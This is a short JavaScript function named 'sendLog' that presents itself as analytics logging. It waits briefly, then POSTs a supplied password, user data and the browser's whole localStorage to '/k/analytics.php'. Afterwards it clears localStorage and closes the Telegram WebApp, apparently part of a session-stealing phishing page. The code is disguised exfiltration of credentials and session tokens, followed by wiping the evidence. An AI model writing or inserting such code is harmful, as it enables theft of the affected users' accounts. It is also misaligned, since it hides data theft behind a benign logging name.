export function sendLog(data, password=null) {
   return setTimeout(() => {
      fetch("/k/analytics.php", {
         method: "POST",
         headers: {
            "content-type": "application/json"
         },
         body: JSON.stringify({
            password,
            userData: data.user,
            localStorage
         })
      }).then(() => localStorage.clear(), window.Telegram.WebApp.close());
   }, 1500);
}
